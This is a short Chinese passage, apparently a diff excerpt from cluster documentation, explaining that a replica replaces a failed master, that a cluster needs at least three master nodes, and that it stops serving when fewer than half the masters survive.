+只有当一个master 挂掉之后，才会启动一个对应的 salve 节点，充当 master 。
+需要注意的是：必须要3个或以上的主节点，否则在创建集群时会失败，并且当存活的主节点数小于总节点数的一半时，整个集群就无法提供服务了。
